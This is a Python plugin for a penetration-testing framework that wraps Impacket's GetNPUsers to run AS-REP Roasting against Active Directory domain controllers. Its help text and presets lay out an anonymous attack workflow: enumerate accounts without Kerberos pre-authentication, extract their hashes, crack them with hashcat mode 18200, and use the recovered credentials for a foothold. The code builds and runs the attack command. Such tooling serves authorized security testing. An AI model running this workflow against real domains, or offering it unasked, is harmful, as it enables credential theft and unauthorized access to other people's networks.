#!/usr/bin/env python3
"""
souleyez.plugins.impacket_getnpusers - AS-REP Roasting attack
"""

import subprocess
import time
from typing import List

from .impacket_common import find_impacket_command
from .plugin_base import PluginBase

HELP = {
    "name": "Impacket GetNPUsers - AS-REP Roasting",
    "description": (
        "Need to extract Kerberos hashes without credentials?\n\n"
        "GetNPUsers performs AS-REP Roasting, extracting Kerberos hashes for accounts "
        "that don't require Kerberos pre-authentication. These hashes can be cracked "
        "offline with hashcat or john.\n\n"
        "Use GetNPUsers after domain enumeration to:\n"
        "- Find accounts with 'Do not require Kerberos preauthentication' set\n"
        "- Extract AS-REP hashes without valid credentials\n"
        "- Identify weak passwords in Active Directory\n"
        "- Get initial access foothold\n\n"
        "Quick tips:\n"
        "- No authentication required (can work anonymously)\n"
        "- Output format compatible with hashcat mode 18200\n"
        "- Use with username list for better results\n"
        "- Check for accounts with SPN and no pre-auth\n"
    ),
    "usage": 'souleyez jobs enqueue impacket-getnpusers <domain>/<username> --args "-dc-ip <dc_ip>"',
    "examples": [
        'souleyez jobs enqueue impacket-getnpusers CONTOSO.LOCAL/ --args "-dc-ip 10.0.0.82 -usersfile users.txt"',
        'souleyez jobs enqueue impacket-getnpusers CONTOSO.LOCAL/ --args "-dc-ip 10.0.0.82 -no-pass"',
        'souleyez jobs enqueue impacket-getnpusers CONTOSO.LOCAL/user --args "-dc-ip 10.0.0.82 -format hashcat"',
    ],
    "flags": [
        ["-dc-ip <ip>", "Domain Controller IP address"],
        ["-usersfile <file>", "File with usernames to test"],
        ["-no-pass", "Don't ask for password (anonymous)"],
        ["-format <john|hashcat>", "Output format (default: john)"],
        ["-request", "Request TGT for users"],
    ],
    "preset_categories": {
        "anonymous": [
            {
                "name": "Anonymous AS-REP Roast",
                "args": ["-dc-ip", "<target>", "-no-pass", "-format", "hashcat"],
                "desc": "Extract AS-REP hashes without authentication (anonymous)",
            },
            {
                "name": "With Username List",
                "args": [
                    "-dc-ip",
                    "<target>",
                    "-usersfile",
                    "users.txt",
                    "-format",
                    "hashcat",
                    "-no-pass",
                ],
                "desc": "Test list of usernames for AS-REP roasting",
            },
        ],
        "authenticated": [
            {
                "name": "AS-REP Roast (Authenticated)",
                "args": ["-dc-ip", "<target>", "-format", "hashcat"],
                "desc": "Extract AS-REP hashes with valid domain account",
            },
            {
                "name": "Request All Vulnerable Accounts",
                "args": ["-dc-ip", "<target>", "-request", "-format", "hashcat"],
                "desc": "Find and extract all AS-REP roastable accounts",
            },
        ],
    },
    "presets": [],
}

# Flatten presets
for category_presets in HELP["preset_categories"].values():
    HELP["presets"].extend(category_presets)

HELP["help_sections"] = [
    {
        "title": "What is GetNPUsers (AS-REP Roasting)?",
        "color": "cyan",
        "content": [
            {
                "title": "Overview",
                "desc": "GetNPUsers performs AS-REP Roasting to extract Kerberos hashes for accounts that don't require Kerberos pre-authentication, which can be cracked offline.",
            },
            {
                "title": "Use Cases",
                "desc": "Extract crackable hashes without credentials",
                "tips": [
                    "Find accounts with 'Do not require Kerberos preauthentication' set",
                    "Extract AS-REP hashes without valid credentials",
                    "Identify weak passwords in Active Directory",
                    "Get initial access foothold",
                ],
            },
        ],
    },
    {
        "title": "How to Use",
        "color": "green",
        "content": [
            {
                "title": "Basic Workflow",
                "desc": "1. Run anonymously (-no-pass) with username list\n     2. Extract AS-REP hashes for vulnerable accounts\n     3. Crack hashes with hashcat mode 18200\n     4. Use cracked credentials for access",
            },
            {
                "title": "Key Options",
                "desc": "Essential GetNPUsers parameters",
                "tips": [
                    "-no-pass: Anonymous enumeration",
                    "-usersfile: Test multiple usernames",
                    "-format hashcat: Output for hashcat cracking",
                    "-dc-ip: Domain Controller IP address",
                ],
            },
        ],
    },
    {
        "title": "Tips & Best Practices",
        "color": "yellow",
        "content": [
            (
                "Best Practices:",
                [
                    "Use -usersfile with common username lists",
                    "Output in hashcat format (-format hashcat)",
                    "Works without any authentication (anonymous)",
                    "Crack hashes with: hashcat -m 18200 hashes.txt wordlist.txt",
                    "Check for SPN accounts without pre-auth",
                ],
            ),
            (
                "Common Issues:",
                [
                    "No hashes found: Pre-auth may be required for all accounts",
                    "DC unreachable: Verify -dc-ip is correct",
                    "Format errors: Use -format hashcat or john",
                    "Empty results: Try authenticated scan with valid credentials",
                ],
            ),
        ],
    },
]


class ImpacketGetNPUsersPlugin(PluginBase):
    name = "Impacket GetNPUsers"
    tool = "impacket-getnpusers"
    category = "credential_access"
    HELP = HELP

    def build_command(
        self, target: str, args: List[str] = None, label: str = "", log_path: str = None
    ):
        """Build command for background execution with PID tracking."""
        args = args or []

        # Replace <target> placeholder
        args = [arg.replace("<target>", target) for arg in args]

        # Find the correct command (varies by install: apt vs pipx)
        getnpusers_cmd = find_impacket_command("GetNPUsers")
        if not getnpusers_cmd:
            return None  # Tool not installed

        # Build command - GetNPUsers expects: domain/ -dc-ip <ip> [options]
        # Check if first arg is a domain (contains / or looks like domain.tld)
        cmd = [getnpusers_cmd]

        # If args starts with domain/, use that as positional arg (not target IP)
        if args and ("/" in args[0] or args[0].count(".") >= 1):
            # First arg is the domain, use it as positional
            cmd.append(args[0])
            args = args[1:]
        else:
            # Target is the domain
            cmd.append(target)

        cmd.extend(args)

        return {"cmd": cmd, "timeout": 1800}

    def run(
        self, target: str, args: List[str] = None, label: str = "", log_path: str = None
    ) -> int:
        """Execute impacket-GetNPUsers and write output to log_path."""

        args = args or []

        # Replace <target> placeholder
        args = [arg.replace("<target>", target) for arg in args]

        # Find the correct command (varies by install: apt vs pipx)
        getnpusers_cmd = find_impacket_command("GetNPUsers")
        if not getnpusers_cmd:
            if log_path:
                with open(log_path, "w", encoding="utf-8") as fh:
                    fh.write("ERROR: GetNPUsers not found. Install with:\n")
                    fh.write("  Kali: sudo apt install python3-impacket\n")
                    fh.write("  Ubuntu: pipx install impacket\n")
            return 1

        # Build command - GetNPUsers expects: domain/ -dc-ip <ip> [options]
        cmd = [getnpusers_cmd]

        # If args starts with domain/, use that as positional arg (not target IP)
        if args and ("/" in args[0] or args[0].count(".") >= 1):
            # First arg is the domain, use it as positional
            cmd.append(args[0])
            args = args[1:]
        else:
            # Target is the domain
            cmd.append(target)

        # Add remaining args
        cmd.extend(args)

        if not log_path:
            try:
                proc = subprocess.run(
                    cmd, capture_output=True, timeout=120, check=False
                )
                return proc.returncode
            except Exception:
                return 1

        try:
            # Create metadata header
            with open(log_path, "w", encoding="utf-8", errors="replace") as fh:
                fh.write(f"=== Plugin: Impacket GetNPUsers ===\n")
                fh.write(f"Target: {target}\n")
                fh.write(f"Args: {args}\n")
                fh.write(f"Label: {label}\n")
                fh.write(
                    f"Started: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}\n"
                )
                fh.write(f"Command: {' '.join(cmd)}\n\n")

            # Run GetNPUsers
            proc = subprocess.run(
                cmd, capture_output=True, timeout=120, check=False, text=True
            )

            # Write output
            with open(log_path, "a", encoding="utf-8", errors="replace") as fh:
                if proc.stdout:
                    fh.write(proc.stdout)

                if proc.stderr:
                    fh.write(f"\n\n# Error output:\n{proc.stderr}\n")

                fh.write(
                    f"\nCompleted: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}\n"
                )
                fh.write(f"Exit Code: {proc.returncode}\n")

            return proc.returncode

        except subprocess.TimeoutExpired:
            with open(log_path, "a", encoding="utf-8", errors="replace") as fh:
                fh.write("\n\nERROR: GetNPUsers timed out after 120 seconds\n")
            return 124

        except FileNotFoundError:
            with open(log_path, "w", encoding="utf-8", errors="replace") as fh:
                fh.write("ERROR: impacket-getnpusers not found in PATH\n")
                fh.write("Install: apt install python3-impacket\n")
            return 127

        except Exception as e:
            with open(log_path, "a", encoding="utf-8", errors="replace") as fh:
                fh.write(f"\n\nERROR: {type(e).__name__}: {e}\n")
            return 1


plugin = ImpacketGetNPUsersPlugin()
